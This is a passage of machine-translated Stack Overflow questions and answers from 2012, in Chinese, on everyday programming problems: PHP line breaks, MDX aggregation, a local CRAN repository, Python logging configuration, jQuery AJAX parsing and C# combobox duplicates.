> 时间：2012-08-13T01:35:35.107

您需要使用`<br/>`而不是打印，`\n`因为默认的 PHP mime 类型是 HTML，并且您使用`<br/>`来完成 HTML 中的换行符。

例如，

```
<?php

$my_array = array("stuff1", "stuff2", "stuff3");

echo $my_array[0] . "<br/>";
echo $my_array[1] . "<br/>";
echo $my_array[2] . "<br/>";

?> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-13T01:37:43.843

来自我的 PHP 教科书：

> 新的 php 程序员（尤其是具有 C 背景的程序员）经常犯的一个错误是尝试通过在打印的字符串中放置行尾字符（“\n”）来中断浏览器中的文本行。要理解为什么这不起作用，您必须区分 php 的输出（通常是 HTML 代码，准备通过 Internet 发送到浏览器程序）与用户浏览器呈现输出的方式。大多数浏览器程序都会自行选择如何拆分 HTML 文本中的行，除非您使用`<BR>`标签。字符串中的行尾字符将在 php 发送到用户浏览器的 HTML 源代码中放置换行符（这对于创建可读的 HTML 源代码仍然很有用），但它们通常不会影响文本的外观一个网页。

`<br>`所有浏览器都能正确解释标签，而标签通常`\n`只会影响源代码并使其更具可读性。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-13T01:35:45.483

那是因为在 HTML 中，换行符是`<br />`，而不是`"\n"`。

# ssas - MDX; 获取层次结构中除命名值之外的所有值的度量聚合

> ID：11927261
> 
> 赞同：1
> 
> 时间：2012-08-13T01:33:31.840
> 
> 标签：ssas, hierarchy, mdx

这个元组为我提供了维度 X 的度量 X 的聚合`[MyHierarchy].[MyHierarchy].&[some_value]`。

```
([Measures].[X], [MyHierarchy].[MyHierarchy].&[some_value]) 
```

但是什么是补充 - 即同一层次结构中的Measures.X，**但不包括** `[MyHierarchy].[MyHierarchy].&[some_value]`

我确定这是 EXCEPT 函数，但我似乎无法正确使用语法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T03:35:15.637

聚合任何类型的集合的一般想法是：

```
with member [Measures].[Y] as 
       aggregate( 
         except( [hierarchy].members, { excluded } ), 
         [Measures].[X] )
       ) 
```

Aggregate() 正在处理 [Measures] 的任何实际聚合。问题是，如果 [hierarchy].members 包含一些中间（父）成员，那么您的值将被计算两次。

如果聚合是 SUM 并且您有一个*all*成员，那么下面给出了预期的结果：

```
with member [Measures].[Y] as 
       ( [hierarchy].[all], [Measures].[X] ) 
       - sum( { excluded }, [Measures].[X] ) 
```

如果不是*全部*，那么您可以使用第一级的成员：

```
with member [Measures].[Y] as 
       sum( [hierarchy].levels(0), [Measures].[X] ) 
       - sum( { excluded }, [Measures].[X] ) 
```

_

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T06:25:43.353

以下表达式适用于非线性聚合函数：

```
WITH MEMBER [Measures].[Y] as 
       Aggregate( 
         Except( [MyHierarchy].[MyHierarchy].&[some_value].Level.Members, { [MyHierarchy].[MyHierarchy].&[some_value] } ), 
         [Measures].[X] )
       ) 
```

当您必须排除**属于同一级别**的多个成员（排除的成员在`excludedMembers`集合中）时，您可以对其进行概括：

```
WITH MEMBER [Measures].[Y] as 
       Aggregate( 
         Except( excludedMembers.Item(0).Level.Members , excludedMembers ), 
         [Measures].[X] )
       ) 
```

# r - R - 设置我自己的 CRAN 存储库

> ID：11927266
> 
> 赞同：10
> 
> 时间：2012-08-13T01:34:49.663
> 
> 标签：r, package, cran

我想建立一个本地 CRAN 存储库。我只想在这个存储库中放一个包（我们称之为 MyPackage ）。我这样做的原因是我想与我公司的人分享这个包。顺便说一句 - 我们都使用 Ubuntu Linux。我已经这样做了：

*   我有一个 Web 服务器（BOA Web 服务器）并创建了一个名为 R 的 Web 文件夹。制作文件夹 src 和 contrib。
*   在 contrib 文件夹中，我将我的包 MyPackage（tar.gz）加上 PACKAGES 文件。

但是，当我这样做时：

```
install.packages("MyPackage", repos = "127.0.0.1/R" ) 
```

这没用 ;

```
Warning: unable to access index for repository [ ]
Warning message:
In getDependencies(pkgs, dependencies, available, lib) :
  package ‘MyPackage’ is not available (for R version 2.13.1) 
```

你们能指导我一下并告诉我正确的文件夹结构是什么吗？谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-13T01:53:09.380

请参阅 R Admin 手册的“[第 6.6 节设置包存储库](http://cran.r-project.org/doc/manuals/R-admin.html#Setting-up-a-package-repository)”。

*大约三年后编辑*：我们现在拥有[drat 包](http://dirk.eddelbuettel.com/code/drat.html)，它可以自动创建存储库，并且可以巧妙地使用 GitHub 为您托管它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-20T16:54:29.443

您可能只需要正确指定 URL；`http://127.0.0.1/R`.

此外，请确保您可以在浏览器中访问该 URL。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-21T15:02:06.060

miniCRAN对我很有用[。](https://cran.rstudio.com/web/packages/miniCRAN/index.html)使用 miniCRAN 创建存储库的优势很少：

*   **安全性：**许多 R 用户习惯于从 CRAN 或其镜像站点之一随意下载和安装新的 R 包。
*   **更轻松的离线安装：**要将软件包安装到离线服务器，您还需要下载所有软件包依赖项，使用 miniCRAN 可以更轻松地以正确格式获取所有依赖项。
*   **改进的版本管理：**在多用户环境中，有充分的理由避免在服务器上不受限制地安装多个软件包版本。
*   **使用其他 R 包索引：**您可能希望从 CRAN 以外的公共存储库中获取包，例如 BioConductor、r-forge、OmegaHat 等。
*   **准备自己的 R 存储库：**您可能希望将自定义内部包添加到存储库。

见简介：

1.  [使用 miniCRAN 创建本地 CRAN 存储库](https://cran.r-project.org/web/packages/miniCRAN/vignettes/miniCRAN-introduction.html)
2.  [使用 miniCRAN 创建本地包存储库](https://docs.microsoft.com/en-us/sql/advanced-analytics/r/create-a-local-package-repository-using-minicran#bkmk_manual)

# vpn - 使 HTTP 代理使用 tun/tap 设备

> ID：11927269
> 
> 赞同：2
> 
> 时间：2012-08-13T01:35:01.503
> 
> 标签：vpn, squid, http-proxy, tun

我正在尝试使我用来通过 VPN 连接到我大学的网络的工具成为可能。问题是，我只能生成一个 tun/tap 设备。该工具本身不支持使用特定的网络接口，但它支持使用 HTTP 代理。

所以现在我正在寻找一个可以绑定到特定接口（tun 设备）的 HTTP 代理，以便让该工具通过这个 HTTP 代理连接到我的 VPN。

我看过 privoxy an squid 但我找不到他们支持它的暗示。

你知道任何支持我计划做的 HTTP 代理吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-05T20:17:29.250

我相信仅仅绑定到一个 tun 接口是不够的。由于进入您的 HTTP 代理的数据包将是 IP 数据包，因此您还需要代理代码中的一些 TCP 堆栈来终止连接。Lwip 是一个看起来功能齐全的嵌入式设备堆栈。也许您可以使用它来终止连接并将其代理出来。

此外，squid 和 privoxy 都不支持 tuntap 设备。

希望这可以帮助。

# javascript - 从 Google 地图中移除 KML 叠加层

> ID：11927273
> 
> 赞同：2
> 
> 时间：2012-08-13T01:35:54.327
> 
> 标签：javascript, google-maps, google-maps-api-3, kml

我有一个重置按钮，我想在单击时重置地图（包括删除覆盖）。

我一直在阅读，显然您删除 KML 覆盖的方式是：

1.  将您的 kml 变量声明为全局变量

    `var ctaLayer = new google.maps.KmlLayer(null);`

2.  这些是导致 kml 文件覆盖在谷歌地图上的行

```
 var ctaLayer = new google.maps.KmlLayer(kmlFile);
   ctaLayer.setMap(map); 
```

3.  然后调用 setMap(null) 删除覆盖。

    `ctaLayer.setMap(null);`

但是，这似乎不起作用。我没有收到任何错误，所以我猜我错过了什么？我会很感激任何关于让它工作的建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T05:21:17.760

从第二个 var ctaLayer（使其成为函数本地的那个）前面删除 var。

# android - 网格渲染问题 libgdx

> ID：11927277
> 
> 赞同：5
> 
> 时间：2012-08-13T01:36:38.523
> 
> 标签：android, opengl-es, libgdx

我有一个非常简单的程序，它加载一个波前 obj 文件，旋转并显示它。问题是程序渲染它有一些问题（比如缺少三角形）。当我尝试使用取自 NeHe 教程的顶点缓冲区渲染 Pyramid 时，我遇到了类似的问题。所以我不知道是什么导致了这个渲染问题。你能帮助我吗？![巴吉航天飞机](../Images/ed71d784c2ee21b581c837ebbc0c4908.png)

```
package com.jam.libgdx3DTest;

import com.badlogic.gdx.Game;
import com.badlogic.gdx.Gdx;
import com.badlogic.gdx.graphics.*;
import com.badlogic.gdx.graphics.g3d.loaders.obj.ObjLoader;

import java.io.InputStream;

public class Libgdx3DTest extends Game {

    private Mesh shuttleMesh;
    private Camera camera;
    private float rotateAngle;

    public void create() {
        if (shuttleMesh == null) {
            InputStream in = Gdx.files.internal("shuttle.obj").read();
            shuttleMesh = ObjLoader.loadObj(in, false);
        }
    }

    public void render() {
        Gdx.gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);

        Gdx.gl10.glMatrixMode(GL11.GL_MODELVIEW_MATRIX);

        Gdx.gl10.glLoadIdentity();

        camera.update();
        camera.apply(Gdx.gl10);

        rotateAngle += 0.5f;
        Gdx.gl10.glRotatef(rotateAngle, 0f, 1f, 0f);
        Gdx.gl10.glRotatef(-90f, 1f, 0f, 0f);

        shuttleMesh.render(GL11.GL_TRIANGLES);
    }

    public void resize(int width, int height) {
        float aspectRatio = (float) width / (float) height;
        camera = new PerspectiveCamera(67, 2f * aspectRatio, 2f);
        camera.translate(0f, 0f, 12f);
    }

    public void pause(){
    }

    public void resume(){
    }

    public void dispose() {
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T01:15:09.757

我认为您可能遇到了缠绕问题，即模型的缠绕与 OpenGL 不同。

OpenGL Winding 默认是逆时针的，虽然这可以通过 glFrontFace(GL_CW);

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-28T16:51:33.610

我认为这是你的问题

```
shuttleMesh.render(GL11.GL_TRIANGLES) 
```

应该

```
shuttleMesh.render(GL11.GL_TRIANGL_FAN); 
```

给妈妈

# python - 如何在 Python 中配置日志记录

> ID：11927278
> 
> 赞同：36
> 
> 时间：2012-08-13T01:36:51.813
> 
> 标签：python, python-2.7, logging

我是 Python 新手，刚刚开始一个项目。我习惯`log4j`在 Java 中使用，我想在 Python 中记录所有模块和类，就像在 Java 中一样。

在 Java 中，我在 src 文件夹中有一个日志配置文件，名称`log4j.properties`如下：

```
log4j.rootLogger=DEBUG, Console, fileout

log4j.appender.Console=org.apache.log4j.ConsoleAppender
log4j.appender.Console.layout=org.apache.log4j.PatternLayout
log4j.appender.Console.layout.ConversionPattern=%d{dd/MM/yyyy HH:mm:ss} %5p [%t] (%F:%L) - %m%n

log4j.appender.fileout=org.apache.log4j.RollingFileAppender
log4j.appender.fileout.File=servidor.log
log4j.appender.fileout.layout=org.apache.log4j.PatternLayout
log4j.appender.fileout.layout.ConversionPattern=%d{dd/MM/yyyy HH:mm:ss} (%F:%L) %p %t %c - %m%n 
```

它记录到控制台和文件。

在我的类中，我只需要导入`log4j`并添加一个静态属性来恢复`log4j`加载配置的记录器，然后所有类都将登录控制台和文件。配置文件按名称自动加载。例如：

```
import org.apache.log4j.Logger;

public class Main {
    public static Logger logger = Logger.getLogger(Main.class);
    public static void main(String[] args) {
        logger.info("Hello");
    }
} 
```

现在我在 Python 中设置日志记录时遇到问题，我已经阅读了文档，但我找不到在许多模块/类中使用它的方法。如何以一种简单的方式设置 Python 日志记录，以便在每个模块/类中无需大量代码来记录我的模块和类？是否可以重现我用 Python 编写的相同代码？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-08-13T01:57:27.577

实际上在 Python 中它看起来非常相似。有不同的方法可以做到这一点。我通常创建一个非常简单的记录器类：

```
import os
import logging 
import settings   # alternativly from whereever import settings  

class Logger(object):

    def __init__(self, name):
        name = name.replace('.log','')
        logger = logging.getLogger('log_namespace.%s' % name)    # log_namespace can be replaced with your namespace 
        logger.setLevel(logging.DEBUG)
        if not logger.handlers:
            file_name = os.path.join(settings.LOGGING_DIR, '%s.log' % name)    # usually I keep the LOGGING_DIR defined in some global settings file
            handler = logging.FileHandler(file_name)
            formatter = logging.Formatter('%(asctime)s %(levelname)s:%(name)s %(message)s')
            handler.setFormatter(formatter)
            handler.setLevel(logging.DEBUG)
            logger.addHandler(handler)
        self._logger = logger

    def get(self):
        return self._logger 
```

然后，如果我想在类或模块中记录某些内容，我只需导入记录器并创建一个实例。传递类名将为每个类创建一个文件。然后，记录器可以通过调试、信息、错误等将消息记录到其文件中：

```
from module_where_logger_is_defined import Logger

class MyCustomClass(object):

    def __init__(self):
        self.logger = Logger(self.__class__.__name__).get()   # accessing the "private" variables for each class

    def do_something():
        ...
        self.logger.info('Hello')

    def raise_error():
        ...
        self.logger.error('some error message') 
```

# 更新的答案

多年来，我改变了我使用 Python 日志记录的方式。主要基于良好实践，我在应用程序启动期间首先加载的任何模块中配置整个应用程序的日志记录，然后在每个文件中使用单独的记录器。例子：

```
 # app.py (runs when application starts)

import logging
import os.path

def main():
    logging_config = {
        'version': 1,
        'disable_existing_loggers': False,
        'formatters': {
            'standard': {
                'format': '%(asctime)s [%(levelname)s] %(name)s: %(message)s'
            },
        },
        'handlers': {
            'default_handler': {
                'class': 'logging.FileHandler',
                'level': 'DEBUG',
                'formatter': 'standard',
                'filename': os.path.join('logs', 'application.log'),
                'encoding': 'utf8'
            },
        },
        'loggers': {
            '': {
                'handlers': ['default_handler'],
                'level': 'DEBUG',
                'propagate': False
            }
        }
    }
    logging.config.dictConfig(logging_config)
    # start application ...

if __name__ == '__main__':
    main() 
```

```
 # submodule.py (any application module used later in the application)

import logging

# define top level module logger
logger = logging.getLogger(__name__)

def do_something():
    # application code ...
    logger.info('Something happended')
    # more code ...
    try:
        # something which might break
    except SomeError:
        logger.exception('Something broke')
        # handle exception
    # more code ... 
```

以上是推荐的方法。每个模块都定义了自己的记录器，并且可以在检查日志时根据`__name__`属性轻松识别在哪个模块中记录了哪些消息。这从我的原始答案中删除了样板文件，而是使用`logging.config`了 Python 标准库中的模块。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-13T02:18:54.400

文档[提供了在多个模块中使用记录器的一个很好的示例](http://docs.python.org/howto/logging.html#logging-basic-tutorial)。基本上，您在程序开始时设置一次日志记录。然后，您将日志记录模块导入您想要进行日志记录的任何位置，并使用它。

## 我的应用程序.py

```
import logging
import mylib

def main():
    logging.basicConfig(filename='myapp.log', level=logging.INFO)
    logging.info('Started')
    mylib.do_something()
    logging.info('Finished')

if __name__ == '__main__':
    main() 
```

## mylib.py

```
import logging

def do_something():
    logging.info('Doing something') 
```

此示例显示了一个非常简单的记录器设置，但您可以非常轻松地使用[各种配置记录的方法](http://docs.python.org/howto/logging.html#configuring-logging)来设置更高级的场景。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-07-16T19:12:10.820

python 中的内置日志记录模块需要几行代码来配置类似 log4j 的功能，即文件附加器，基于时间和大小的文件轮换。

对于代码中功能的单行实现，您可以使用 package `autopylogger`。

这是基础知识。

**1.安装包**

```
pip install autopylogger 
```

**2\. 用法**

```
# import the package
from autopylogger import init_logging

# Initialise the logging module
mylogger = init_logging(log_name="myfirstlogger", log_directory="logsdir") 
```

就是这样，日志对象已经初始化并启用了文件写入和旋转功能。

您可以通过以下命令写入日志。

```
# Write logs - DEBUG | INFO | WARNING | ERROR
mylogger.debug('This is a INFO log')
mylogger.info('This is a DEBUG log')
mylogger.warning('This is a WARNING log')
mylogger.error('This is a ERROR log') 
```

* * *

**为什么要使用 autopylogger？**

*   **文件附加**程序 - 默认启用。

*   **日志轮换**- 默认启用。还可以基于`time`&配置轮换`size`，这是基本日志库中缺少的。

*   **关键日志邮件功能**- 通过使用您的 SMTP 服务器凭据初始化库来发送关键日志的邮件。在生产环境中派上用场。

文档参考[Github官方页面](https://github.com/rohitlal125555/autopylogger)，[PyPI官方页面](https://pypi.org/project/autopylogger/)

# php - 在 JQUERY 中通过 AJAX 从 PHP 创建关联数组

> ID：11927279
> 
> 赞同：0
> 
> 时间：2012-08-13T01:37:09.897
> 
> 标签：php, jquery, ajax

我第一次在这里求救。不确定我的标题是否正确明确，但这是我现在唯一能想到的。我已经做了两天了，我读了很多不同的东西，我觉得我完全糊涂了。我会尽量准确。这是我的问题，

首先，这是我基于的 jQuery 代码：

```
$thumbnails.find( 'a' ).each( function() {
        pictures.push({
            src: $( this ).attr( 'href' ),    
            title: $( this ).find( 'img' ).attr( 'title' ),
            valign: $( this ).find( 'img' ).data( 'valign' )
        });
    }) 
```

你注意到了**图片**。推进去。现在，这与，

```
$.vegas( 'slideshow', { 
        backgrounds: pictures,
        delay: 4000,
        fade:5000
     })( 'overlay' ); 
```

请注意**背景**属性如何使用**图片**来获取所需的图像名称。我现在不知道如何调用**图片**。它是关联数组还是对象？

无论如何，我不想从 HTML 节点获取图像的文件名。我正在使用 PHP 来获取服务器上目录中的文件名，并使用这些文件名生成 XML 文档。这是在我的 PHP 脚本中生成 XML 文档的部分，（我只需要 5 张图片即可）

```
header("Content-type: text/xml");
    echo '<?xml version="1.0"?>';
    echo "<img>";
    for($i=0;$i<5;$i++){ 
        echo "<src>img/" . $rep_aleatoire[$i] . "/" . $img_aleatoire[$i] . "</src>";
        echo "<title>" . $img_aleatoire[$i] . "</title>";
    }
    echo "</img>"; 
```

这就是 XML 文档的样子，

```
<img>
<src>img/portraits/DSC_0161.jpg</src>
<title>DSC_0161.jpg</title>
<src>img/nature/DSC_0019 copy-tych 3.jpg</src>
<title>DSC_0019 copy-tych 3.jpg</title>
<src>img/portraits/DSC_0157.jpg</src>
<title>DSC_0157.jpg</title>
<src>img/editions/DSC_0053.jpg</src>
<title>DSC_0053.jpg</title>
<src>img/editions/DSC_Ant.jpg</src>
<title>DSC_Ant.jpg</title>
</img> 
```

这是我用来获取 XML 数据的 JQUERY 部分，

```
$.get("main.php", function(data){
        var rep = new Array;
        var file = new Array;
        $(data).find("img").each(function(){
            $(this).find('src').each(function(i){
                rep[i] = $(this).text();
            });
            $(this).find('title').each(function(i){
                file[i] = $(this).text();
            });;
            for(i=0;i<rep.length;i++){
                pictures.push({
                    src: $(rep[i]),    
                    title: $(file[i])
                });
            }
         });
}); 
```

**图片**已被初始化超出此函数的范围，因此它应该可以在我需要的任何地方使用，但它不是。如果我尝试在该函数之外访问它，它是空的。此外，当在该函数的范围内时，它包含的只是对象。我什至不知道我是否以正确的方式做这件事。我尝试了很多不同的方法，我什至不记得了。我只是无法获得 XML 文档中生成的实际数据。

我当然希望我已经足够清楚了，你们明白我在追求什么。我只是想生成正确格式的**图片**，以便在**$vegas**函数中使用它。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:22:18.740

首先。总是声明你的变量。

错误声明：

```
var rep = new Array;
var file = new Array; 
```

应该是

```
var rep = new Array();
var file = new Array(); 
```

甚至更好：

```
var rep = [];
var file = []; 
```

声明`i`，您在最后一个循环中使用。

```
for(var i=0;i<rep.length;i++){
... 
```

甚至更好：

```
var i;
for(var i=0;i<rep.length;i++){
.. 
```

完成此操作后，您会注意到您尝试通过数组值访问 jquery 对象。

```
pictures.push({
  src: $(rep[i]),    
  title: $(file[i])
}); 
```

你可能的意思是：

```
pictures.push({
  src: rep[i],
  title: rep[i]
}); 
```

当然，请确保`var pictures`在您使用它的所有范围内都可用。

# c# - 如何在组合框中不出现重复的名称 c#

> ID：11927283
> 
> 赞同：0
> 
> 时间：2012-08-13T01:38:22.687
> 
> 标签：c#, linq, combobox

![在此处输入图像描述](../Images/dea85977cb443d4f9f47039e28e7fa65.png)

我遇到了一个问题，我似乎无法让组合框中的名称出现一次而不是多个。我的代码中有什么会导致这个问题吗？任何帮助将不胜感激。

下面是将名称链接到组合框的代码。

```
private void Create_EmpDetails_Load(object sender, EventArgs e)
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            var viewEmpName = (from viewEN in Setupctx.employees
                               join ufi u in Setupctx.ufis on viewEN.UFISID equals u.UFISID
                               select new { u.EmployeeName , u.UFISID}).Distinct().ToList();

            cbName.DataSource = viewEmpName;
            cbName.DisplayMember = "EmployeeName";
            cbName.ValueMember = "EmployeeName";
            //cbName.ValueMember = "UFISID";

        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T01:46:14.717

这些行中的每一行都有不同的`UFISID`，因此`Distinct()`不会删除它们。

听起来您只想向员工展示：

```
cbName.DataSource = Setupctx.Employees; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T01:56:20.587

可能你换个就够了

```
select new { u.EmployeeName , u.UFISID} 
```

和

```
select new { u.EmployeeName } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T02:03:55.383

我对此进行了编辑，并设法仅显示了一个名称而不是多个记录。

```
private void Create_EmpDetails_Load(object sender, EventArgs e)
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            var viewEmpName = (from viewEN in Setupctx.employees
                               join ufi u in Setupctx.ufis on viewEN.UFISID equals u.UFISID
                               select new { u.EmployeeName }).Distinct().ToList();

            cbName.DataSource = viewEmpName;
            cbName.DisplayMember = "EmployeeName";
            cbName.ValueMember = "EmployeeName";
            //cbName.ValueMember = "UFISID";

        }
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T03:35:35.830

在组合框中，我们将字符串显示为用户的 DisplayMember 和成员的 id（可能对我们很重要）作为我们的 ValueMember。我们有更多时间使用 ids 。我的例子：

```
class Country
{
    public string Name { get; set; }
    public int ID { get; set; }
    public Country( int i,string s) { Name = s; ID = i; }
}

class ComboItem
{

    public string DisplayMember { get; set; }

    public int ValueMember { get; set; }

}

class ComboItemEqualityComparer : IEqualityComparer<ComboItem>
{

    public bool Equals(ComboItem item1, ComboItem item2)
    {
        if (item1.ValueMember == item2.ValueMember && item1.DisplayMember == item2.DisplayMember)
        {
            return true;
        }

        return false;
    }

    public int GetHashCode(ComboItem item)
    {
        string str = item.DisplayMember + item.ValueMember;
        return str.GetHashCode();
    }
} 
```

测试 ：

```
 List<Country> countries = new List<Country> {
                                  new Country(1,"UK"), 
                                  new Country(2,"Turkey"), 
                                  new Country(8,"Turkey"),
                                  new Country(5,"Turkey"), 
                                  new Country(2,"Turkey"),
                                  new Country(3,"USA") ,
                                  new Country(3,"USA")};  //.Distinct(new CountryEqualityComparer()).ToList();

        var Data = (from i in countries
                select new ComboItem { ValueMember = i.ID, DisplayMember = i.Name }).Distinct(new ComboItemEqualityComparer()).ToList();

        cbName.DataSource = Data;

        cbName.DisplayMember = "DisplayMember";
        cbName.ValueMember = "ValueMember"; 
```

有时我们的数据显示名称相同，但它们的 ID 不同。我们可以将 ComboItemEqualityComparer equals 方法更改为：

```
public bool Equals(ComboItem item1, ComboItem item2)
    {
        if (item1.ValueMember == item2.ValueMember )
        {
            return true;
        }

        return false;
    } 
```

请享用。

对于这个问题，我们可以：

```
....
select new ComboItem { ValueMember = u.UFISID, DisplayMember = u.EmployeeName }).Distinct(new yourIEqualityComparer()).ToList(); 
```

# php - document.getElementById("").value 有限制吗？

> ID：11927286
> 
> 赞同：0
> 
> 时间：2012-08-13T01:38:44.327
> 
> 标签：php, javascript, buttonclick

我编写了一个代码来从许多 id 中读取值并在按下按钮时显示该值。但是，按下时无法显示数值。我将文件保存为 php，但我需要在按下按钮时使用 javascript 来显示变量的值。下面是我的代码的一部分，它导致它不起作用

```
<html>
<head>
    <title>...</title>
CSS code here
    </head>
    <body>  
                $senario_1=3;
                $senario_2=3;
                $senario_3=3;
                $senario_4=3;
        <div id="content">
            <p class="senario_1">Senario 1</p>
            <p class="senario_2">Senario 2</p>
            <p class="senario_3">Senario 3</p>
            <p class="senario_4">Senario 4</p>
            <input id="senario_1" class="senario_1" type="text" value="<?php echo $senario_1 ?>"/>
            <input id="senario_2" class="senario_2" type="text" value="<?php echo $senario_2 ?>"/>
            <input id="senario_3" class="senario_3" type="text" value="<?php echo $senario_3 ?>"/>
            <input id="senario_4" class="senario_4" type="text" value="<?php echo $senario_4 ?>"/>
            <script type='text/javascript'>
                setTimeout(function()
                {
                    window.location.reload(true);
                },60000);
            </script>
        </div>  
        <div id="menu">
            <button onclick="refresh()" name="refresh" class="refresh">Refresh</button>
            <button onclick="senario_1()" name="senario_1" class="senario_1">Senario 1</button>
            <button onclick="senario_2()" name="senario_2" class="senario_2">Senario 2</button>
            <button onclick="senario_3()" name="senario_3" class="senario_3">Senario 3</button>
            <button onclick="senario_4()" name="senario_4" class="senario_4">Senario 4</button>
            <button onclick="reset()" name="reset" class="reset">Reset</button>
        </div>      
            <script type='text/javascript'>
                function refresh()
                {
                    document.getElementById("content").innerHTML=window.location.reload(true);
                }
                function senario_1()
                {
                    document.getElementById("senario_1").value="<?php echo $senario_1 ?>";
                }
                function senario_2()
                {
                    document.getElementById("senario_2").value="<?php echo $senario_2 ?>";
                }
                function senario_3()
                {
                    document.getElementById("senario_3").value="<?php echo $senario_3 ?>";
                }
                function senario_4()
                {
                    document.getElementById("senario_4").value="<?php echo $senario_4 ?>";
                }
                function reset()
                {
                    document.getElementById("senario_1").value="";
                    document.getElementById("senario_2").value="";
                    document.getElementById("senario_3").value="";
                    document.getElementById("senario_4").value="";
                }

        function refresh()
                {
                    document.getElementById("content").innerHTML=window.location.reload(true);
                }
                function senario_1()
                {
                    document.getElementById("top_left").value="<?php echo $senario_1 ?>";
                }
                function senario_2()
                {
                    document.getElementById("top_right").value="<?php echo $senario_2 ?>";
                }
                function senario_3()
                {
                    document.getElementById("bottom_left").value="<?php echo $senario_3 ?>";
                }
                function senario_4()
                {
                    document.getElementById("bottom_right").value="<?php echo $senario_4 ?>";
                }
                function reset()
                {
                    document.getElementById("top_left").value="";
                    document.getElementById("top_right").value="";
                    document.getElementById("bottom_left").value="";
                    document.getElementById("bottom_right").value="";
                }</script>

    </body>

</html> 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-13T01:53:25.440

```
<html>
    <head>
        <title></title>
        <style type="text/css">
        input.senario_1
        {
            position:absolute;
            top:8%;
            left:30%;
        }
        input.senario_2
        {
            position:absolute;
            top:16%;
            left:30%;
        }
        input.senario_3
        {
            position:absolute;
            top:63%;
            left:30%;
        }
        input.senario_4
        {
            position:absolute;
            top:71%;
            left:30%;
        }
        #content
        {
            float:left;
            width:80%;
        }
        #menu
        {
            float:right;
            width:20%;
        }       
        button.refresh
        {
            position:absolute;
            top:8%;
            width:20%;
        }
        button.senario_1
        {
            position:absolute;
            top:28%;
            width:20%;
        }
        button.senario_2
        {
            position:absolute;
            top:38%;
            width:20%;
        }
        button.senario_3
        {
            position:absolute;
            top:48%;
            width:20%;
        }
        button.senario_4
        {
            position:absolute;
            top:58%;
            width:20%;
        }
        button.reset
        {
            position:absolute;
            top:78%;
            width:20%;
        }
        P.senario_1
        {
            position:absolute;
            top:4%;
            left:30%;
        }
        P.senario_2
        {
            position:absolute;
            top:12%;
            left:30%;
        }
        P.senario_3
        {
            position:absolute;
            top:59%;
            left:30%;
        }
        P.senario_4
        {
            position:absolute;
            top:67%;
            left:30%;
        }
        </style>
    </head>
    <body>  
        <?php
            $filename = 'input.txt';
            $file=fopen($filename,"r") or exit("Unable to open file!");;        
            $data=array();          
    for($i=0;$i<2;$i++)
            {
                $getData=fgets($file);
                $data[$i]=$getData;
            }
            $memory=$data[1];
            list($senario_1,$senario_2,$senario_3,$senario_4)=split("\t\t\t",$memory);
            fclose($file);
        ?>
        <div id="content">
    <p class="senario_1">Senario 1</p>
            <p class="senario_2">Senario 2</p>
            <p class="senario_3">Senario 3</p>
            <p class="senario_4">Senario 4</p>
            <input id="senario_1" class="senario_1" type="text" value="<?php echo $senario_1 ?>"/>
            <input id="senario_2" class="senario_2" type="text" value="<?php echo $senario_2 ?>"/>
            <input id="senario_3" class="senario_3" type="text" value="<?php echo $senario_3 ?>"/>
            <input id="senario_4" class="senario_4" type="text" value="<?php echo $senario_4 ?>"/>
            <script type='text/javascript'>
                setTimeout(function()
                {
                    window.location.reload(true);
                },60000);
            </script>
        </div>  
        <div id="menu">
            <button onclick="refresh()" name="refresh" class="refresh">Refresh</button>
            <button onclick="senario_1()" name="senario_1" class="senario_1">Senario 1</button>
            <button onclick="senario_2()" name="senario_2" class="senario_2">Senario 2</button>
            <button onclick="senario_3()" name="senario_3" class="senario_3">Senario 3</button>
            <button onclick="senario_4()" name="senario_4" class="senario_4">Senario 4</button>
            <button onclick="reset()" name="reset" class="reset">Reset</button>
        </div>      
            <script type='text/javascript'>
                function refresh()
                {
                    document.getElementById("content").innerHTML=window.location.reload(true);
                }
                function senario_1()
                {
                    document.getElementById("senario_1").value="1";
                }
                function senario_2()
                {
                    document.getElementById("senario_2").value="2";
                }
                function senario_3()
                {
                    document.getElementById("senario_3").value="3";
                }
                function senario_4()
                {
                    document.getElementById("senario_4").value="4";
                }
                function reset()
                {
                    document.getElementById("senario_1").value="";
                    document.getElementById("senario_2").value="";
                    document.getElementById("senario_3").value="";
                    document.getElementById("senario_4").value="";
                }
            </script>
    </body>
</html> 
```

该文件看起来像这样（2行）abcd 1 2 3 4

# php - 多次替换一个子字符串而不循环？（使用替换数组）

> ID：11927287
> 
> 赞同：0
> 
> 时间：2012-08-13T01:38:46.447
> 
> 标签：php

是否可以在一个字符串中多次替换一个子字符串，但替换不同？我知道这可以通过循环来完成`str_replace()`，但我发誓必须有一个更简单的方法！

例子：

```
<?php
// Returns '1.2.3';
echo str_replace('%', array(1, 2, 3), '%.%.%');
?> 
```

我真的需要在字符串上开始一个循环，然后一次替换一个匹配项吗？这似乎是一种草率的方式来做一些应该更简单的事情。我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:49:13.760

